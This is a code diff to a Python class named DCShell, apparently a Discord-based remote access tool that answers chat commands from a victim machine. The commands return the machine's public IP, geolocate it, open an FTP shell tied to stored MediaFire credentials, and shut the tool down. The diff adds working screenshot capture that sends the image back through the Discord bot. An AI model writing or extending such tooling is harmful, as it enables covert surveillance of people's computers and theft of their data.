@@ -9,7 +9,7 @@ class DCShell:
         self.hMenu = HelpMenu()
         self.myIp = get_ip()
         self.bot = bot
-        self.mediafireEmail = {"email": mediafireEmail, "password": mediafirePassword}
+        self.mediafire = {"email": mediafireEmail, "password": mediafirePassword}
         self.ftp = FTPShell(self, "@" in str(mediafireEmail))
 
     async def process(self, message) -> None:
@@ -27,7 +27,7 @@ class DCShell:
             else:
                 await message.reply(embed=self.hMenu.display())
         elif cmd[0] in ["ip", "ipconfig", "ipinfo", "viewip", "showip"]:
-            await message.reply("This is my public IP: "+self.myIp)
+            await message.reply("This is my **public IP**: `"+self.myIp+"`")
         elif cmd[0] in ["info", "geolocate", "geolocation", "infomenu"]:
             info = get_information()
             await message.reply(embed=discord.Embed(
@@ -38,10 +38,11 @@ class DCShell:
         elif cmd[0] in ["ftp", "ftp+", "ftpshell", "shellftp"]:
             self.ftp.active = True
             await message.reply("**Welcome to the FTP+ shell!**\n> `help` for a list of commands")
-        elif cmd[0] in ["screen", "view", "ss", "screenshare", "screenshot"]: # TODO
-            pass
+        elif cmd[0] in ["screen", "view", "ss", "screenshare", "screenshot"]:
+            imgPath = get_screenshot()
+            await message.reply("Screenshot was **successfully** taken:", file=imgPath)
         elif cmd[0] in ["kill", "stop"]:
-            await message.reply("Killing this shell...")
+            await message.reply("**Killing** this shell...")
             exit()
         elif cmd[0] == "author":
             await message.reply(embed=self.hMenu.authorInfo())
